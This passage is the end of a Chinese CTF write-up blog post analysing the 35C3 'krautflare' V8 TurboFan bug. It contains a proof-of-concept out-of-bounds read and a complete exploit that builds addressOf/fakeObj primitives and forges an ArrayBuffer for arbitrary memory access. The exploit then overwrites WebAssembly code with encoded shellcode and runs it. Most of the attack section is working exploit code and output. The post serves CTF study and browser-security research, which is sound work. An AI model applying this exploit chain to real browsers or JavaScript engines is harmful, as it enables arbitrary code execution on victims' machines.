+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function opt(x) &#123;</span><br><span class="line">   var escape = &#123;v:-0&#125;;</span><br><span class="line">   var a = Object.is(Math.expm1(x),escape.v);</span><br><span class="line">   var arr = [1.1,2.2,3.3,4.4];</span><br><span class="line">   a += 3;</span><br><span class="line">   return arr[a];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(0);</span><br><span class="line">   opt(&quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(-0));</span><br></pre></td></tr></table></figure>
+<p>运行后发现确实发生了数组越界</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/krautflare# ./d8 1.js --trace-turbo</span><br><span class="line">Concurrent recompilation has been disabled for tracing.</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method  using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method  using Turbofan</span><br><span class="line">2.89459808827e-311</span><br></pre></td></tr></table></figure>
+<p>查看IR图，这回在<code>Typer</code>阶段，还不能确定准确值，因此有一个范围<code>Range(3,4)</code><br><img src="https://p4.ssl.qhimg.com/t0129d29f5c4e26423c.png"><br>然后过了<code>Escape Analyse</code>阶段，才发现范围在<code>Range(0,3)</code>内，于是到了<code>simplified lowering</code>阶段，便把<code>CheckBounds</code>给去除了<br><img src="https://p5.ssl.qhimg.com/t012a34341a0c5e0c32.png"><br>由此造成了溢出，可以利用溢出，构造一个oob_arr，来达到自由溢出，然后利用手法就一样了。<br>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var oob_arr;</span><br><span class="line">var obj_arr;</span><br><span class="line">var double_arr;</span><br><span class="line"></span><br><span class="line">function opt(x) &#123;</span><br><span class="line">   var arr = [1.1,2.2,3.3,4.4];</span><br><span class="line">   oob_arr = [5.5,6.6];</span><br><span class="line">   obj_arr = [obj];</span><br><span class="line">   double_arr = [1.1];</span><br><span class="line">   var tmp = &#123;escapeVar: -0&#125;;</span><br><span class="line">   var index = Object.is(Math.expm1(x),tmp.escapeVar);</span><br><span class="line">   index *= 11;</span><br><span class="line">   //制造oob_arr</span><br><span class="line">   arr[index] = p64f(0,0x1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(0);</span><br><span class="line">   opt(&quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//触发漏洞</span><br><span class="line">opt(-0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var double_elements_map = oob_arr[0x10];</span><br><span class="line">var obj_elements_map = oob_arr[0x9];</span><br><span class="line"></span><br><span class="line">function fakeObj(addr) &#123;</span><br><span class="line">   var addr_f = i2f64(addr + 0x1n);</span><br><span class="line">   double_arr[0] = addr_f;</span><br><span class="line">   oob_arr[0x10] = obj_elements_map;</span><br><span class="line">   var a = double_arr[0];</span><br><span class="line">   oob_arr[0x10] = double_elements_map;</span><br><span class="line">   return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   obj_arr[0] = obj;</span><br><span class="line">   oob_arr[0x9] = double_elements_map;</span><br><span class="line">   var a = obj_arr[0];</span><br><span class="line">   oob_arr[0x9] = obj_elements_map;</span><br><span class="line">   return u64f(a) - 0x1n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line"></span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line">print(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));</span><br><span class="line">/*</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">%SystemBreak();</span><br><span class="line">*/</span><br><span class="line">wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0xe8n;</span><br><span class="line">var element_addr = faker_addr - 0x50n;</span><br><span class="line">//print(&#x27;element_addr=&#x27; + element_addr.toString(16));</span><br><span class="line">//fake a ArrayBuffer&#x27;s Map</span><br><span class="line">faker[0] = i2f64(0n);</span><br><span class="line">faker[1] = i2f64(0x1900042317080808n);</span><br><span class="line">faker[2] = i2f64(0x00000000082003ffn);</span><br><span class="line">faker[3] = i2f64(0);</span><br><span class="line"></span><br><span class="line">//faker a ArrayBuffer</span><br><span class="line">faker[4] = i2f64(element_addr+0x1n); //map</span><br><span class="line">faker[5] = i2f64(0); //properties</span><br><span class="line">faker[6] = i2f64(0); //elements</span><br><span class="line">faker[7] = p64f(0xffffffff,0); //length</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line">faker[9] = 0x2;</span><br><span class="line"></span><br><span class="line">var arb_ArrayBuffer = fakeObj(element_addr+0x20n);</span><br><span class="line">var adv = new DataView(arb_ArrayBuffer);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>在数值误差的漏洞当中，我们往往利用<code>CheckBounds</code>的消除来构造<code>OOB</code>数组，其中要保证这个数组是一个非逃逸对象，即在函数内部声明和使用，这样JIT收集的信息充分，才能决定是否要移除<code>CheckBounds</code>节点，似乎在新版本v8中，<code>simplified lowering</code>阶段不再去除该节点，以后遇到再看。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/21Y1">从漏洞利用角度介绍Chrome的V8安全研究</a><br><a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">introduction-to-turbofan</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/73081003">利用边界检查消除破解Chrome JIT编译器</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/214020#h3-6">关于2018_35c3ctf_krautflare的分析复现</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-harmofs01/" rel="prev" title="华为CTF2020第三场_harmofs01">
+      <i class="fa fa-chevron-left"></i> 华为CTF2020第三场_harmofs01
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/31/34c3ctf-v9/" rel="next" title="34c3ctf-v9">
+      34c3ctf-v9 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90IR%E5%9B%BE"><span class="nav-number">2.1.</span> <span class="nav-text">生成IR图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Turbolizer%E6%90%AD%E5%BB%BA"><span class="nav-number">2.2.</span> <span class="nav-text">Turbolizer搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sea-of-node%E5%AD%A6%E4%B9%A0"><span class="nav-number">2.3.</span> <span class="nav-text">sea of node学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckBounds%E8%8A%82%E7%82%B9"><span class="nav-number">2.4.</span> <span class="nav-text">CheckBounds节点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckBounds%E6%B6%88%E9%99%A4%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">2.5.</span> <span class="nav-text">CheckBounds消除的利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-google-ctf2018-final-just-in-time"><span class="nav-number">3.</span> <span class="nav-text">0x02 google-ctf2018-final-just-in-time</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-35c3ctf-krautflare"><span class="nav-number">4.</span> <span class="nav-text">0x03 35c3ctf-krautflare</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90-1"><span class="nav-number">4.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
